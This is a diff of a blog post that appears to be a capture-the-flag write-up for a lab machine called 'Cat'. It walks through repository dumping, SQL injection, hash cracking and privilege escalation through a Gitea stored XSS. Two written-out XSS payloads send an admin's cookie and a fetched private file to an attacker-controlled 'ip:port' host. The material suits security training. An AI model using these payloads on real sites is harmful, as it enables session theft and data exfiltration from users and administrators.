@@ -9,155 +9,158 @@ thumb: /assets/images/logos/bf7ae27f4e0ce1703bdd10d538334d9e.webp
 # Cat
 
 # 1. Enumeration
-
+<br/><br/>
 Start enumerating ports, only two are opened
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image.png' | relative_url }})
-
+<br/><br/>
 Check web application running on it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_1.png' | relative_url }})
-
+<br/><br/>
 We could self-register a new account
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_2.png' | relative_url }})
-
+<br/><br/>
 And we are able to upload a cat info
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_3.png' | relative_url }})
-
+<br/><br/>
 To have a deeper knowledge about this site, we could perform a fuzzing searching for directories or php files 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_4.png' | relative_url }})
-
+<br/><br/>
 Nothing interesting in the previous dictionary try with another one
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_5.png' | relative_url }})
-
+<br/><br/>
 Effectively there is a repository behind it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_6.png' | relative_url }})
-
+<br/><br/>
 Use git dumper for extract files in this project
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_7.png' | relative_url }})
-
+<br/><br/>
 Now we can check the backend to find vulnerabilities
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_8.png' | relative_url }})
-
+<br/><br/>
 In admin.php an admin username is disclosed
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_9.png' | relative_url }})
-
+<br/><br/>
 By the way, username field is not sanitized in here
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_10.png' | relative_url }})
-
+<br/><br/>
 The cat name parameter is used in a sql query as it is send by the user
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_11.png' | relative_url }})
-
+<br/><br/>
 Here we can build two potential vector attacks, a XSS in the username that could steal the cookie of the admin when the registered users are requested, and a SQL injection in the accept cat endpoint, which is available only as admin
-
+<br/><br/>
 # 2. User flag
-
+<br/><br/>
 So, first set a xss payload to obtain admin flag, by now just put payload in the username field
-
+<br/><br/>
 ```bash
 <script src=x onerror=this.src="http://ip:port/?c="+encodeURIComponent(document.cookie)></script>
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_12.png' | relative_url }})
-
+<br/><br/>
 Now register a new cat with that account, that’s how the admin could load the payload name
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_13.png' | relative_url }})
-
+<br/><br/>
 Get admin cookie
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_14.png' | relative_url }})
-
+<br/><br/>
 A new endpoint is available here
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_15.png' | relative_url }})
-
+<br/><br/>
 As we saw before accept_cat endpoint has sql injection, we can use sqlmap here, note that the admin cookie is needed here
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_16.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_17.png' | relative_url }})
-
+<br/><br/>
 rosa hash is crackeable
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_18.png' | relative_url }})
-
+<br/><br/>
 Get access through ssh 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_19.png' | relative_url }})
-
+<br/><br/>
 Looking around we have access to logs, sometimes those files do not encrypt data
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_20.png' | relative_url }})
-
+<br/><br/>
 Effectively we have axel password disclosed
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_21.png' | relative_url }})
-
+<br/><br/>
 User flag was there!!
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_22.png' | relative_url }})
-
+<br/><br/>
 # 3.Priv esc
-
+<br/><br/>
 The last step give us a clue about a possible privilege escalation attack, we have a mail where it is being persistent in a new management system on port 3000
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_23.png' | relative_url }})
-
+<br/><br/>
 That port is open here
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_24.png' | relative_url }})
-
+<br/><br/>
 Forward those ports to see what is going on
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_25.png' | relative_url }})
-
+<br/><br/>
 Gitea is being used to this purpose
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_26.png' | relative_url }})
-
+<br/><br/>
 As a first steps check versions, this seems to be an oldie one because right now they are on 1.23 version
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_27.png' | relative_url }})
-
+<br/><br/>
 This vulnerability consist in a stored xss where someone could leverage description field in a repo to plant a javascript payload trying to retrieve the content of /administrator/Employee-management/raw/branch/main/index.php which has important information about the administrator which according to the mail seems to be jorbert
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_28.png' | relative_url }})
-
+<br/><br/>
 Prepare the payload
-
+<br/><br/>
 ```bash
 <a href="javascript.fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://ip:port/?content='+encodeURIComponent(data)))">hahaha</a>
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_29.png' | relative_url }})
-
+<br/><br/>
 This is our malicious repo
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_30.png' | relative_url }})
-
+<br/><br/>
 Now send an email to jobert as it is said in the mail
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_31.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_32.png' | relative_url }})
-
+<br/><br/>
 wait a little bit to obtain root password
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_33.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_34.png' | relative_url }})
-
+<br/><br/>
 Machine pwned!!!
 
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
